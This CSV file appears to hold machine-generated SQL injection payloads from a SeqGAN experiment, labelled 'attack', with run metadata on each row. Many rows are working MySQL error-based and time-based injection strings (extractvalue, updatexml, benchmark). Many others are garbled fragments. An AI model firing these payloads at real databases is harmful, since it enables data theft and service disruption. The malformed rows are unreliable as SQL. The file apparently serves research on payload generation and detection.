attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,394
attack,"1%""   )    (  extractvalue  (  (  (  9627,concat  (  (  (  (  0x5c,0x7171706a71,  (  (  (  select   (  (   (  4415  (  (  elt  (  2917  =  (  (  0x5c,  (  (  5000000,md5  (  (  0x2e,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  t  (  (  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  =  (  1297,1   )    (  extractvalue  (  9627,md5  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,395
attack,1%'  =  'kwb'  =  'o'  =  'kFROM WHERE AND analince as,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,396
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,397
attack,"1%""   )    u AND 'i'  =  6369  =  1559 orOextractvalue  (  3393,concat  (  (  (    (  (  (  0x2e,0x7171706a71,  (  benchmark  (  5000000(  (  0x4b774c75   (  8375  (  (  (  0x2e,0x7171706a71,  (  (  9627,concat  (  (  3393,1   (  )  i",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,398
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,399
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,400
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,401
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,402
attack,"1%""   )    )     )  extractvalue  (  (  (  (  (  (  1808,concat  (  (  =  (  (  7982select   (  2446  (  eltane d5  (  1808  =  (  3393,1   from dual  )  )   end  (  SELECT from   (  (  elt  elt  (  3393  =  =  3393,1   from   (  3576  =  8862,0x7171706a71,  (  select   (  case 0 from   (  (  elt  (  elt  (  0x2e,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,403
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,404
attack,"1 and extractvalue  (  (  (  3393,concat  (  1759(  (  (  (  (  1808  =  (  3393,1   )    ual  (  0x5c2518  )  1  =  (  (  DIA)USWYSERNCD   )    AND b  (  3393,1   (  (  case else from 0 else 5603 9103 0 0 0 cast  (  (  (  (  (  (  0x5c,  (  (  benchmark  (  5000000(  select   (  elta  l  (  1808,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,405
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,406
attack,"1%""   )    AND 'i'    )  select   (  4066  =  6800 or extractvalue  (  9788,md5  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  7982  =  (  1297,1   )    ualt)   from d5  )   SELECT du duade  case when   (  (  elt  elt  (  elt  (  5000000  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  benchmark  (  (  elt  (  1808",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,407
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,408
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%kbCOU    ,mresytana  )  ,0x7171706a71(    (  (    (  (  0x5c,  (  benchmark  (  (  5000000,md5  (  select   (  elt  (  (  0x2e,0x7171706a71,  (  select   (  8375  =  (  7982,1   (  extractvalue  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  select   (  elt  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  7982  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,409
attack,"1%""  )   and extractvalue  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (   (  (  (  (   (  (   (  (  6581  (  (  (  7982  =  (  (  (  0x2e,0x7171706a71,  (  select   (  elta  elt  (  elt  (  1808  =  (  1297,concat  (  (  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  0x2e,0x7171706a71,0x7171706a71,  (  (  select   (  (  elt 0 a  l  (  6800  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,410
attack,"1%""  )   and updatexml  (  (  (  (  0x5c,  (  (  (  (  benchmark  (  (  (  9627,concat  (  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  (  (  (  benchmark  (  (  5000000,m5  (  (  =  (  3393,concat  (  (  0x2e,0x7171706a71,  (  (  0x5c,0x7171706a71,updatexml  (  (  (  (  (  (  (  select   (  elt  (  e  (  (  1297  =  9627  (  (  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,411
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,412
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,413
attack," and extractvalue  (  (  (  (  (  (  9627,concat  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  0x2e,concat  (  (  (  0x5c,  (  benchmark  (  (  (  5000000,md5(  1297  =  (  1297,concat  (  0x2e,0x7171706a71,1   (  5464  (  0x2e,0x7171706a71,  (  =  (  (  benchmark  (  (  e  (  1808=  1297,1   then 5847 else cast  (  (  (  (  1049  (  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,414
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,415
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,416
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,417
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  ""oc",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,418
attack,"1%""   )    )     (  (  select   (  case and updatexml  (  (  (  (  (  (  (  (  3393,concat  (  (  (  (  (  (  0x2e,m5  (  (  =  (  9627,concat  (  (  (  (  0x2e,0x7171706a71,  (  select   (  1808,0x7171706a71,  (  select   (  case when   (  4415  (  0x2e,  (  select   (  )   SELECT dual  )   enda  (  =  (  6581  =  (  (  0x2e,md5  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,419
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,420
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  ''  =  'kbblob_na)ddu  e  (  elt  (  elt0x4b774c75  )   from d 0 when   (  3539  (  case  =  1759,  (  5000000,md5  (  (  0x2e,  (  (  (  benchmark  (  benchmark  (  5000000,md5  (  (  0x2e,concat  (  =  (  (  (  select   (  5000000,md5  (  3393,1   )    (  extractvalue  (  9627,updatexml  (  (  (  1812  =  (  3364  utel  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,421
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%j""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,422
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,423
attack,"1%""  )   procedure analysanal  el  (  4415  )  1808  =  (  3393,  (  (  benchmark  (  (  2917,1   from dua  (   SELECT d5  (  3393,0x7171706a71)  (  2501  =  (  1 2501  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  benchmark  (  5000000,md5  (  1808,  (  (  0x5c,  (  (  (  benchmark  (  (  (  5000000,md5  (  (  0x5c,  (  5000000",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,424
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,425
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,426
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,427
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,428
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,429
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ''  =  '"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""khn"" like ""kun%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,430
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  "")      )    AND 'i'  =  1 or 1724  (  (  (  1808  =  (  (  0x5c,  (  (  (  5000000,md5  (  (  0x5c,(  (  benchmark  (  (  5000000,md5  (  (  5000000,md5  (  (  7982  =  (  1808,concat  (  =  (  3393,1   (  )  1 as inamb     )  )   from duat 0 0 0 * from d5  =  (  3393,1   (  case when   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,431
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,432
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,433
attack,"1%'  =  'kbd   (  )   (  (  (  elt  elt  (  1297  )  (  select   (  elt  3393,  (  0x2e,md5  (  (  9788  (  (  0x4b774c75   (  5704  (  elt  (  select   (  ual  )   end  (  case 0 0 from d d5  el  )   from dua  )   (  2501  (  (lt  (  el  (  0x5c,  (  (  select   (  elt  (  e  (  1297  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,434
attack,"1%'   )    ( a int  (   (  (  (  elt  (  elt  (  1354    =  (  0x5c,0x7171706a71,  (  (  benchmark  (  benchmark  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  (  (  0x2e,  (  (  select   (  elt  (  e  (  1808  concat  (  =  (  (  0x5c,md5  (  (  0x5c,  (  (  (  9627,concat  (  (  (  select   (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,435
attack,"1%updatexml  (  8860,,updatexml  (  (  ' like 'l  (  7982,1   )    (  select   (  case from 0 from   (  )  (   (  (  elt  elt  (  e  (  9103  =  (    (  0x2e,0x7171706a71,  (  (  5000000(  (  select   (  elt 0 al  elt  (  1808  =  (  3393,1   )    (  extractvalue  (  9627,concat  (  (  (  5423  =  (  benchmark  (  (  5000000(  (  (  2917  =  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,436
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,437
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,438
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,439
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,440
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,441
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,442
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,443
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,444
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,445
attack,"1%""  )   )    )    AND 1802  (  )  1 or updatexml  (  (  (  (  (  (  (  (  1 or updatexml  (  (  (  (  (  (  (  0x2e,(  (  (  (  (  (  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  benchmark  (  (  5000000(  (  (  (  (  (  (  0x5c,(  (  (  5000000,md5  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,446
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,447
attack,"1%""   )    (  extractvalue  (  (  (  (  9627,concat  (  (  (  =  (  (  (  (  (  (  (   and,0x7171706a71(  (  select   (  elt  )  3393  =  (  (  1049  =  (  3393,m'  =  '2917  =  (  0x52515a50   (  (  el  (  1808  )  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  select   (  elt  (  el  0x4b774c75   end  (  (  el  (  3393  =  (  0x5c",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,448
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,449
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,450
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,451
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eipk'  =  'j",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,452
attack,"1% or or updatexml  (  (  (  (  (  0x2e,(  (  3393,8083  (  (  (  1808,concat  (  (  (  0x5c,0x7171706a71extractvalue  (  extractvalue  (  (  (  (  (  9627,md5  =  (  (  3393,1   then 4774 else cast  (  (  (  benchmarkd5 0 ual  )  e  (  elt  (  1759  =  (  3393,md5  (  0x5c,0x7171706a71,  (  select   (  el  (  e(  7982  =  (  3393,1   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,453
attack,"1%%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ' bnU1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'egkucusengmed5  (  (  18080x7171706a71,m5  (  (  t  (  (  (  0x52515a50   (  extractvalue  (  3393,1   )    )  extractvalue  (  (  benchmark  (  (  a  =  utelt  (  elt  (  1297  =  (  3393,1   )    uUSEROM  )  =  updatexml  (  (  lo_ anal  )  7982  =  3393,  (  select   (  elt  2917  =  (  3393,1",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,454
attack,"1%""   )    )     (  extractvalue  (  (  7982,concat  (  (  (  3393  (  (  (  (  (  (  =  (  extractvalue  (  (  (  benchmark  (   (  (  6200  )   (  6166  (  (  (  1297  =  (  0x2e,0x7171706a71,  (  5000000,md5  (  7982  =  (  3393,  (  (  benchmark  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  (  5000000,md5    ( (  0x5c,m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,455
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ''  =  'xw'  =  'knh' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,456
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,457
attack,"1%""   )    (  extractvalue  (   (  ual  1808,1   )    )    AND int  select  (  case when   (  (  5000000(  (  3393,1   )    (  updatexml  (  (  (  9627,concat  (  (  (  benchmark  (  (  1808,1   (  case 0 from dual  )  el  )  el  )  )   or extractvalue  (  (  3393,concat  (  (  (  =  (  7982,1   )    (  extractvalue  (  9627,1   )    (  select   (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,458
attack,"1%""   )    (  extractvalue  (  (  (   (  ual  el  (  (  e  (  0x5c,0x7171706a71,  (  (  select   (  elt  elt)  7982  =  (  (  0x2e,0x7171706a71,  (  5000000(  3393  (  (  (  benchmark  (  (  (  0x52515a50   (  e  (  elt  (  3393  =  (  1808,concat  (  (  (  (  0x2e,(  (  (  0x5c,0x7171706a71,  (  (  9255,md5  (  3393,m5  (  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,459
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,460
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,461
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,462
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,463
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,464
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,465
attack,"1where% pkddulea  e  (  elt  (  elt  (  3393  =  (  (  0x5c,  (  (  (  select   (  case 0 0 from dual  )  )  )   end  (  9490  )  (   (  (  (   (  5198  (  (  case 0 from 0 from dual  )   end  (  =  (  el  utl  )  1808  =    (  (  (  0x5c,0x7171706a71,  (  select   (   (  2501  (  (  e  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,466
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ' pnn",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,467
attack,"1%',updatexml  (  9627,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  benchmark(   (  6560  (  (  (  0x2e,0x7171706a71,  (  (  5000000,md50x7171706a71,  (  (  (  5000000,md(  (  (  0x5c,0x7171706a71,  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  e  (  0x5c,  (  benchmark  (  2917,concat  (  (  (  (  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,468
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,469
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,470
attack,"1"" and extractvalue  (  (  (  (  (  (  (  (  (  1297,concat  (  (  =  (  (  (  (  0x52515a50   (  5423  (  )  1808  =    (  (  7982  =  (  (  3393  =  (  (  0x2e,1   )    (  extractvalue  (  (  7982,1   )    (  extractvalue  (  benchmark  (  (   from   (  5433  (  (  elt  (  5000000,md5  (  1049  (  0x5c,  (  benchmark  (  (  5000000,md5  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,471
